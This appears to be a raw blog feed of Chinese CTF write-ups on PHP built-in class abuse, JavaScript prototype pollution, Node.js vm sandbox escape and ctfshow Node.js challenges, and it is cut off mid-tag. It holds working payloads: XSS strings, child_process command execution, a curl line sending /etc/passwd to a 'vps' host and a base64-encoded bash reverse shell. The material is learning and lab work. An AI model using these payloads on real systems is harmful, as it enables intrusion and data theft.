23: 10722465754210488857842384539746544074196670, 24: 67952303343509961405922862120527631953, 25: 424678007756192434300006917804988, 26: 449366186013055209469307061, 27: 2694478038943586736328, 28: 24316418691677517, 29: 137492755075, 30: 133317, 31: 1, 32: 0&#125;L &#x3D; &#123;0: 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899, 1: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 2: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 3: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 4: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 5: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 6: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 7: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 8: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 9: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 10: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 11: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 12: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 13: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 14: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 15: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 16: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 17: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 18: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 19: 241267801518963217329803327254141129383508497053892152707957403620167975, 20: 240324048977128823416619126180138745528644638124733113619292984561, 21: 1501209023627137765492979001172871435243212151481455508796928, 22: 11731219952144596819377276074864534430521345582519171825, 23: 11050144307727113700681557772687121323224647867153, 24: 10722465754210488857842384539746544074196670, 25: 67952303343509961405922862120527631953, 26: 424678007756192434300006917804988, 27: 449366186013055209469307061, 28: 2694478038943586736328, 29: 24316418691677517, 30: 137492755075, 31: 133317, 32: 1&#125;</code></pre><p>然后再用(L[i]-R[i+1])//L[i+1]求出flag[i]**3 + flower的值</p><pre class="language-none"><code class="language-none">FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125;</code></pre><p>由于1的ascii的三次方和2的ascii码之间的差值也要比最大的flower大，所以我们就可以遍历一下</p><p>得到flag值</p><pre class="language-python" data-language="python"><code class="language-python">FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125;flag &#x3D; &#39;&#39;for i in range(32):    #FLAG[i] &#x3D; (L[i]-R[i+1])&#x2F;&#x2F;L[i+1]    for j in range(48,123):        if j**3 &lt;&#x3D; FLAG[i] and (j+1)**3 &gt; FLAG[i]:            flag +&#x3D; chr(j)        else:            continueprint(&#39;flag&#x3D;&#39;+flag[::-1])&#x2F;&#x2F;3e807b66ef26d38e671ddcbb9c108250</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道ctf题看php原生类</title>
      <link href="/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>这是ctfshow的一道比赛题</p><p>先来看看源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    echo &quot;\$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;&quot;;    die();&#125;if(isset($_POST[&#39;a&#39;]) &amp;&amp; isset($_POST[&#39;b&#39;]) &amp;&amp; isset($_POST[&#39;c&#39;]))&#123;    $c &#x3D; $_POST[&#39;c&#39;];    $count[++$c] &#x3D; 1;    if($count[] &#x3D; 1) &#123;        $count[++$c] &#x3D; 1;        print_r($count);        die();    &#125;else&#123;        $a &#x3D; $_POST[&#39;a&#39;];        $b &#x3D; $_POST[&#39;b&#39;];        echo new $a($b);    &#125;&#125;?&gt;$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;</code></pre><p>绕过第二个if判断是利用了数组溢出的原理</p><p>然后进入else语句</p><p>一般看到echo new $a($b)这种形式，就需要考虑利用php的原生类来遍历目录以及读取文件</p><h2 id="报错类"><a href="#报错类" class="headerlink" title="报错类"></a>报错类</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>在PHP7版本中，因为Error中带有<code>__toString</code>方法，该方法会将传入给<code>__toString</code>的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226142059060.png"></p><pre class="language-none"><code class="language-none">a&#x3D;Error&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806</code></pre><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>与Error类似，Exception同样有<code>__toString</code>方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173222714.png" alt="image-20220226173222714"></p><pre class="language-none"><code class="language-none">a&#x3D;Exception&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806</code></pre><h2 id="遍历目录类"><a href="#遍历目录类" class="headerlink" title="遍历目录类"></a>遍历目录类</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIterator类的<code>__construct</code>方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173809874.png" alt="image-20220226173809874"></p><p>返回了一个点，这个点代表这当前目录</p><p>如果要匹配其他文件，要利用glob协议</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226174839331.png" alt="image-20220226174839331"></p><p>glob协议支持通配符，所以对于不知道文件名的文件可以利用通配符进行匹配</p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>与DirectoryIterator类似，但实际使用时发现有些不同</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175041268.png" alt="image-20220226175041268"></p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>无需加glob协议，因为这是自带的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175140543.png" alt="image-20220226175140543"></p><h2 id="读取文件类"><a href="#读取文件类" class="headerlink" title="读取文件类"></a>读取文件类</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><blockquote><p>SplFileObject类为文件提供了一个面向对象接口</p></blockquote><p>也就是说我们可以利用这个来读取文件，例如</p><pre class="language-none"><code class="language-none">a&#x3D;SplFileObject&amp;b&#x3D;flag.php</code></pre><p>但是由于这个类返回的是迭代器，所以不能完整的读出文件，所以就要利用php://filter来将文件内容以全部输出</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226181714890.png" alt="image-20220226181714890"></p><h2 id="回到这道题"><a href="#回到这道题" class="headerlink" title="回到这道题"></a>回到这道题</h2><p>我们可以利用</p><p>FilesystemIterator、DirectoryIterator或GlobIterator找到flag所在的目录，再用SplFileObject读出文件内容</p><p>但是这道题中flag文件并不叫flag.php而是flag.md5(???).php，所以我们要用通配符找到真正的flag文件，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226184433903.png" alt="image-20220226184433903"></p><p>在通配符中，？代表一个字符，但是必须存在，而*表示存在任意个字符，但是也包括零个，所以因为迭代器的性质，只加*就只能匹配到flag.php</p><p>但是如果我们用FilesystemIterator，我们可以直接加路径看到这个flag文件，不太理解为什么</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226184809317.png" alt="image-20220226184809317"></p><p>接下来就是用SplFileObject读出来就然后base64解个码就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226185100750.png" alt="image-20220226185100750"></p><h2 id="反射类获取注释"><a href="#反射类获取注释" class="headerlink" title="反射类获取注释"></a>反射类获取注释</h2><p>看见这个想起了去年国赛我唯一出了的一道题</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__file__);class User&#123;    private static $c &#x3D; 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;        &#x2F;**         * flag         *&#x2F;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc&#x3D;$_GET[&quot;rc&quot;];$rb&#x3D;$_GET[&quot;rb&quot;];$ra&#x3D;$_GET[&quot;ra&quot;];$rd&#x3D;$_GET[&quot;rd&quot;];$method&#x3D; new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>flag在注释里但并不会被显示出来，但是我们可以利用通过反射 ReflectionMethod 类来获取类方法的相关信息</p><pre class="language-text" data-language="text"><code class="language-text">?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;e&amp;rd&#x3D;getDocComment</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226193319167.png" alt="image-20220226193319167"></p><p>直接查看类可以用ReflectionClass</p><p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p><h2 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h2><p>这玩意能执行命令</p><p>demo</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; new ReflectionFunction(&#39;system&#39;);echo $function-&gt;invoke(&quot;whoami&quot;);?&gt;    &lt;?php$function &#x3D; new ReflectionFunction(&#39;call_user_func&#39;);echo $function-&gt;invokeArgs(array(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;tem&#39;,&#39;whoami&#39;));&#x2F;&#x2F;array(%27s%27.%27y%27.%27s%27.%27tem%27,%27cat%20&#x2F;f%27.%27lag%27)?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js漏洞</title>
      <link href="/2022/02/21/js%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/02/21/js%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="深入了解JavaScript"><a href="#深入了解JavaScript" class="headerlink" title="深入了解JavaScript"></a>深入了解JavaScript</h2><p>在JavaScript中，一切皆对象</p><p>当我们创建一个js对象如</p><pre class="language-none"><code class="language-none">var a &#x3D; &#123;&#125;;</code></pre><p>它会拥有一些自带的属性，如</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221163610282.png" alt="image-20220221163610282"></p><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221163750576.png" alt="image-20220221163750576"></p><p>这里test()函数的内容其实就是test类的构造函数</p><p>而<strong>constructor</strong>这个属性就是用于查看对象的构造函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p><p>接下来我们要知道<strong>prototype</strong>和**__proto__**又是什么</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103557261-114570044.png" alt="img"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103622089-1134417169.png" alt="img"></p><p>从类的角度讲，<code>prototype</code>是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有<code>__proto__</code>出现，且一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性。</p><p>这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。</p><p>对于a而言有个__proto__属性指向window.Object.prototype</p><p>这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.__proro__ 上面去找 toString。</p><p>所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p><p>对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show()</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221173043928.png" alt="image-20220221173043928"></p><p>总结一下</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li><li>类在运行程序运行时是可以修改的</li></ol><h2 id="JavaScript的原型与原型链"><a href="#JavaScript的原型与原型链" class="headerlink" title="JavaScript的原型与原型链"></a>JavaScript的原型与原型链</h2><p>这种继承机制使得JavaScript中有原型和原型链的存在</p><p><strong>原型</strong></p><p>①所有<code>引用类型</code>都有一个<code>__proto__(隐式原型)</code>属性，属性值是一个普通的对象<br>②所有<code>函数</code>都有一个<code>prototype(原型)</code>属性，属性值是一个普通的对象<br>③所有<code>引用类型的__proto__</code>属性<code>指向</code>它<code>构造函数的prototype</code></p><p><strong>原型链</strong></p><p>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160322110905589-2039017350.png" alt="什么是原型链？"></p><p>举例：</p><p>若有代码</p><pre class="language-none"><code class="language-none">function Parent(month)&#123;    this.month &#x3D; month;&#125;var child &#x3D; new Parent(&#39;Ann&#39;);console.log(child.month); &#x2F;&#x2F; Annconsole.log(child.father); &#x2F;&#x2F; undefined</code></pre><p>则在child中查找某个属性时会</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/20180620134143385" alt="这里写图片描述"></p><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。</p><p>所以我们可以通过修改Object.prototype来实现对变量的修改</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221182419388.png" alt="image-20220221182419388"></p><p>可以看到我们将a.<em>_proto</em>_.bar 设置为2</p><p>新定义的变量也有了bar属性，且为2</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="原型链污染的利用"><a href="#原型链污染的利用" class="headerlink" title="原型链污染的利用"></a>原型链污染的利用</h2><p>当存在控制数组（对象）的“键名”的操作时，我们就可以设置__proto__的值，从而实现原型链污染</p><h3 id="最显然的情况"><a href="#最显然的情况" class="headerlink" title="最显然的情况"></a>最显然的情况</h3><pre class="language-none"><code class="language-none">obj[a][b] &#x3D; valueobj[a][b][c] &#x3D; value</code></pre><p>如果控制了a,b,c及value就可以进行原型链污染的攻击,</p><p>可以控制<code>a=__proto__</code>,,我们就可以给object对象的原型设置一个b属性, 值为value. 这样所有继承object对象原型的实例对象会在本身不拥有b属性的情况下, 都会拥有b属性, 且值为value.</p><h3 id="利用特殊的api"><a href="#利用特殊的api" class="headerlink" title="利用特殊的api"></a>利用特殊的api</h3><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>例如</p><pre class="language-none"><code class="language-none">function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] &#x3D; source[key]        &#125;    &#125;&#125;</code></pre><p>这时如果key是__proto__不就可以直接修改其原型了吗</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221200009010.png" alt="image-20220221200009010"></p><p>但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>只有经过JSON.parse解析,才能让<code>__proto__</code>代表了一个key</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221200323952.png" alt="image-20220221200323952"></p><p>成功污染</p><p>参考文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/xiaoermingn/article/details/80745117?ops_request_misc=%7B%22request_id%22:%22164543411816780274140815%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164543411816780274140815&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-80745117.pc_search_result_cache&utm_term=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1018.2226.3001.4187">【原型和原型链】什么是原型和原型链_沉迷学习 日渐消瘦-CSDN博客_原型链</a></p><p><a href="https://blog.csdn.net/weixin_45551083/article/details/109589386?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_aa&spm=1001.2101.3001.4242.2&utm_relevant_index=3">原型链污染漏洞(一)_lonmar的博客-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/6e623e9debe3">从杭电hgame-week4学原型链污染 - 简书 (jianshu.com)</a></p><p><a href="https://www.cnblogs.com/shuiyi/p/5305435.html">三张图搞懂JavaScript的原型对象与原型链 - 水乙 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/102883325">JavaScript Prototype污染攻击（CTF 例题分析）_a3320315的博客-CSDN博客</a></p><h1 id="node-js-沙盒逃逸"><a href="#node-js-沙盒逃逸" class="headerlink" title="node.js 沙盒逃逸"></a>node.js 沙盒逃逸</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在nodejs当中了，eval始终存在着一定的问题，能够出乎意料的执行系统命令。</p><pre class="language-none"><code class="language-none">对于存在利用可能性的eval函数，可以使用chile_process.exec来间接调用&#x2F;bash.sh。它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。like：读取文件：require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);;   反弹shell：  q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;);  即bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1  </code></pre><p>类eval函数：</p><pre class="language-scss" data-language="scss"><code class="language-scss">setInteval(some_function, 2000)setTimeout(some_function, 2000);相当于匿名函数，即php当中create_function。</code></pre><p>eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 <a href="https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020">node</a>.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221225320251.png" alt="image-20220221225320251"></p><p>在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用</p><p>vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。</p><p>也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息</p><p>这看起来是十分安全的方式</p><p>但在官网中有这样一段话<strong>vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。</strong></p><p>也就是说，vm模块同样有被逃逸的风险</p><h2 id="VM逃逸"><a href="#VM逃逸" class="headerlink" title="VM逃逸"></a>VM逃逸</h2><pre class="language-none"><code class="language-none">const vm &#x3D; require(&quot;vm&quot;);const ctx &#x3D; &#123;&#125;;vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx);console.log(&quot;Never gets executed.&quot;);</code></pre><p>这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出</p><p>创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221230610013.png" alt="image-20220221230610013"></p><p>函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。</p><p>上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。</p><p>所以我们能够用process变量来做更多的东西</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221232104068.png" alt="image-20220221232104068"></p><p>或者这样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222145853148.png" alt="image-20220222145853148"></p><p>参考文章</p><p><a href="https://blog.csdn.net/cosmoslin/article/details/122166825">ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客</a></p><p><a href="http://www.javashuo.com/article/p-vwozjvrz-nu.html">node.js 沙盒逃逸分析 - JavaShuo</a></p><p><a href="https://www.cnblogs.com/ophxc/p/13663121.html">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/7184#toc-10">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></p><h1 id="CTFSHOW-nodejs部分"><a href="#CTFSHOW-nodejs部分" class="headerlink" title="CTFSHOW nodejs部分"></a>CTFSHOW nodejs部分</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154508492.png" alt="image-20220222154508492"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154516338.png" alt="image-20220222154516338"></p><p>用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154618537.png" alt="image-20220222154618537"></p><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>js的命令执行</p><p>可以使用chile_process.exec来间接调用/bash.sh。<br>它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</p><p>exec因为返回值的问题没法利用</p><p>所以这里可以用execSync</p><p>eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p><p>eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;)</p><p>或者spawnSync</p><p>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</p><p>eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</p><p>还可以用global.process.mainModule.constructor._load替代require</p><p>eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>过滤了exec</p><p>但是可以用spawnSync</p><p>还可以利用fs模块文件操作</p><pre class="language-none"><code class="language-none">eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;);eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;);</code></pre><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>数组绕过，但是不同于php的数组绕过</p><pre class="language-none"><code class="language-none">var express &#x3D; require(&#39;express&#39;);var router &#x3D; express.Router();var crypto &#x3D; require(&#39;crypto&#39;);function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;&#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag&#x3D;&#39;xxxxxxx&#39;;  var a &#x3D; req.query.a;  var b &#x3D; req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;  res.end(flag);  &#125;else&#123;  res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);  &#125;  &#125;);module.exports &#x3D; router;</code></pre><p>传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同</p><p>js有个很奇怪的特性</p><p>不能直接比较两个数组</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163045534.png" alt="image-20220222163045534"></p><p>而且拼接字符串时也有个特性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163227744.png" alt="image-20220222163227744"></p><p>也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag</p><p>而如果我们传入的是非数字索引，那么他就会变成js中的对象</p><p>对象的拼接又有这种特性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163556092.png" alt="image-20220222163556092"></p><p>所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163644062.png" alt="image-20220222163644062"></p><h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>common.js里有copy函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164222078.png" 